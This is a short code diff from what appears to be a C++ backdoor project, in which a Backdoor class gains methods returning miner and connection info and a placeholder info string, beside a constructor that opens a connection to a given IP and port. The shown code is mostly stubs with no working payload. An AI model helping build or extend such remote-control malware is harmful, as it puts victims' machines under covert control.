@@ -43,10 +43,14 @@ void Backdoor::download(char *path){
 }
 
 
-void Backdoor::get_miner_info(){
-
+std::string Backdoor::get_miner_info(){
+    return c->connection_info();
 }
 
+
+std::string Backdoor::get_info(){
+    return std::string("asdsa");
+}
 
 Backdoor::Backdoor(char *ip, int port, bool is_server){
     this->c = new Communication(ip, port);
